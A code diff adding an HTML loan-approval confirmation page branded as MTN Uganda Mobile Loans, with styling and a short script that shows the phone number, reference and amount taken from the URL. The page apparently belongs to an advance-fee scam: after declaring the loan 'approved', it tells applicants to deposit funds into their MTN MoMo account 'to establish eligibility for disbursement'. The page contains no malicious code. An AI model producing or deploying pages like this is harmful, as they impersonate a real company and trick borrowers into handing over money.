@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Application Successful - MTN Uganda Loans</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
+
+        body { background: #f4f4f4; min-height: 100vh; display: flex; flex-direction: column; }
+
+        .header {
+            background: #fff; padding: 14px 20px;
+            display: flex; align-items: center; gap: 14px;
+            border-bottom: 3px solid #ffcc00;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.04);
+        }
+        .logo-box { display: flex; align-items: center; gap: 10px; }
+        .logo-icon {
+            width: 40px; height: 40px; background: #ffcc00;
+            border-radius: 8px; display: flex; align-items: center; justify-content: center;
+            font-weight: 800; font-size: 10px; color: #004f9f;
+            line-height: 1; text-align: center; border: 2px solid #004f9f;
+        }
+        .logo-text { font-weight: 800; font-size: 20px; color: #004f9f; letter-spacing: -0.5px; }
+        .header-title { font-size: 14px; font-weight: 700; color: #444; margin-left: auto; }
+
+        .main { flex: 1; display: flex; justify-content: center; padding: 30px 16px 60px; }
+
+        .card {
+            background: #fff; width: 100%; max-width: 500px;
+            border-radius: 20px; padding: 44px 32px 40px;
+            box-shadow: 0 8px 30px rgba(0,0,0,0.08);
+            height: fit-content;
+            text-align: center;
+        }
+
+        .check-circle {
+            width: 96px; height: 96px;
+            border-radius: 50%;
+            background: #ffcc00;
+            display: flex; align-items: center; justify-content: center;
+            color: #111; font-size: 48px; font-weight: 900;
+            margin: 0 auto 26px;
+            box-shadow: 0 14px 32px rgba(255,204,0,0.4);
+            animation: pop 0.5s ease-out;
+        }
+        @keyframes pop {
+            0% { transform: scale(0); opacity: 0; }
+            60% { transform: scale(1.15); }
+            100% { transform: scale(1); opacity: 1; }
+        }
+
+        h1 {
+            font-size: 26px; font-weight: 900; color: #111;
+            margin-bottom: 10px;
+        }
+        .sub {
+            font-size: 15px; color: #666; line-height: 1.6;
+            margin-bottom: 28px;
+        }
+
+        .status-pill {
+            display: inline-block;
+            background: #eaf7ea;
+            color: #1e7d1e;
+            font-size: 12px;
+            font-weight: 800;
+            letter-spacing: 1px;
+            padding: 6px 14px;
+            border-radius: 20px;
+            text-transform: uppercase;
+            margin-bottom: 22px;
+        }
+
+        .info-box {
+            background: #fffef8;
+            border: 1px solid #ffeeb0;
+            border-radius: 14px;
+            padding: 22px 20px;
+            margin-bottom: 24px;
+            text-align: left;
+        }
+        .info-row {
+            display: flex; justify-content: space-between; align-items: center;
+            padding: 10px 0;
+            font-size: 14px;
+        }
+        .info-row + .info-row { border-top: 1px dashed #ffeeb0; }
+        .info-label { color: #7a5c00; font-weight: 600; }
+        .info-value { color: #111; font-weight: 800; text-align: right; }
+        .info-value.ref {
+            font-family: monospace;
+            font-size: 13px;
+            color: #d4a000;
+        }
+
+        .notice-box {
+            background: #fffbee;
+            border-left: 4px solid #ffcc00;
+            border-radius: 8px;
+            padding: 16px 18px;
+            text-align: left;
+            margin-bottom: 22px;
+        }
+        .notice-title {
+            font-size: 13px; font-weight: 800; color: #7a5c00;
+            margin-bottom: 8px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        .notice-text {
+            font-size: 13px; color: #555; line-height: 1.6;
+        }
+        .notice-text + .notice-text { margin-top: 8px; }
+
+        .home-btn {
+            display: inline-block;
+            background: #111; color: #ffcc00;
+            padding: 16px 36px;
+            font-size: 14px;
+            font-weight: 900;
+            letter-spacing: 1.5px;
+            border-radius: 12px;
+            cursor: pointer;
+            text-transform: uppercase;
+            text-decoration: none;
+            transition: background 0.2s, transform 0.1s;
+        }
+        .home-btn:hover { background: #000; }
+        .home-btn:active { transform: scale(0.98); }
+
+        .footer {
+            background: #111; color: #ffcc00; text-align: center;
+            padding: 18px; font-size: 13px; font-weight: 600;
+        }
+
+        @media (max-width: 480px) {
+            .card { padding: 32px 22px; }
+            h1 { font-size: 22px; }
+            .check-circle { width: 80px; height: 80px; font-size: 40px; }
+        }
+    </style>
+</head>
+<body>
+
+    <header class="header">
+        <div class="logo-box">
+            <div class="logo-icon">MTN<br>UG</div>
+            <div class="logo-text">MTN Uganda</div>
+        </div>
+        <span class="header-title">Mobile Loans</span>
+    </header>
+
+    <main class="main">
+        <div class="card">
+
+            <div class="check-circle">✓</div>
+
+            <div class="status-pill">Approved</div>
+
+            <h1>Application Successful</h1>
+
+            <p class="sub">
+                Your loan application has been received and approved. Our team will contact you shortly to complete the process.
+            </p>
+
+            <div class="info-box">
+                <div class="info-row">
+                    <span class="info-label">Reference</span>
+                    <span class="info-value ref" id="refValue">—</span>
+                </div>
+                <div class="info-row">
+                    <span class="info-label">Phone</span>
+                    <span class="info-value" id="phoneValue">—</span>
+                </div>
+                <div class="info-row">
+                    <span class="info-label">Loan Amount</span>
+                    <span class="info-value" id="amountValue">—</span>
+                </div>
+                <div class="info-row">
+                    <span class="info-label">Date</span>
+                    <span class="info-value" id="dateValue">—</span>
+                </div>
+            </div>
+
+            <div class="notice-box">
+                <div class="notice-title">What happens next?</div>
+                <p class="notice-text">
+                    📲 You will be <strong>notified shortly</strong> once your application is fully processed.
+                </p>
+                <p class="notice-text">
+                    💰 Please ensure you <strong>deposit some funds</strong> into your MTN MoMo account to establish eligibility for disbursement.
+                </p>
+            </div>
+
+            <a href="index.html" class="home-btn">Back to Home</a>
+
+        </div>
+    </main>
+
+    <footer class="footer">© 2026 MTN Uganda Loans</footer>
+
+    <script>
+        const params = new URLSearchParams(window.location.search);
+        const phone  = params.get('phone') || '';
+        const ref    = params.get('ref')   || 'REF' + Date.now();
+        const amount = Number(params.get('amount') || 0);
+
+        function fmtPhone(p) {
+            const clean = p.replace(/\D/g, '');
+            if (clean.length === 9) {
+                return '+256 ' + clean.slice(0,3) + ' ' + clean.slice(3,6) + ' ' + clean.slice(6,9);
+            }
+            return clean ? '+256 ' + clean : '—';
+        }
+
+        function fmtAmount(n) {
+            return 'UGX ' + Number(n).toLocaleString();
+        }
+
+        document.getElementById('refValue').textContent   = ref;
+        document.getElementById('phoneValue').textContent = fmtPhone(phone);
+        document.getElementById('amountValue').textContent = fmtAmount(amount);
+
+        const d = new Date();
+        const dateStr = d.toLocaleDateString('en-GB', {
+            day: '2-digit', month: 'short', year: 'numeric'
+        });
+        document.getElementById('dateValue').textContent = dateStr;
+    </script>
+</body>
+</html>
